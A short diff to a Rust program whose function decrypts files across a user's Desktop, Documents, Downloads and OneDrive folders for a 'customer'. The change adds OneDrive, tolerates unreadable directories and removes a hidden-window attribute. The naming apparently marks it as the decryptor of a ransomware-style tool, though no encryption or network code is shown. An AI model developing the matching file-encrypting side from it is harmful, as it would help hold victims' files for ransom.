@@ -1,5 +1,3 @@
-#![windows_subsystem = "windows"]
-
 use reqwest::blocking::Client;
 use std::{collections, fs, io, path};
 
@@ -8,7 +6,8 @@ mod crypto;
 mod filesystem;
 
 fn decrypt_local_filesystem(customer: &crypto::Customer) {
-    let folders = [
+    let folders = vec![
+        "OneDrive",
         "Desktop",
         "Documents",
         "Downloads",
@@ -29,17 +28,18 @@ fn decrypt_local_filesystem(customer: &crypto::Customer) {
 }
 
 fn walk_dir(path: &path::Path, customer: &crypto::Customer) {
-    let contents = fs::read_dir(path).unwrap();
-    for entry in contents {
-        let entry = entry.unwrap();
-        match filesystem::check_dir_entry(&entry.path()) {
-            0 => {
-                walk_dir(&entry.path(), customer);
+    if let Ok(contents) = fs::read_dir(path) {
+        for entry in contents {
+            let entry = entry.unwrap();
+            match filesystem::check_dir_entry(&entry.path()) {
+                0 => {
+                    walk_dir(&entry.path(), customer);
+                }
+                1 => {
+                    crypto::decrypt(&entry.path(), customer);
+                }
+                _ => (),
             }
-            1 => {
-                crypto::decrypt(&entry.path(), customer);
-            }
-            _ => (),
         }
     }
 }
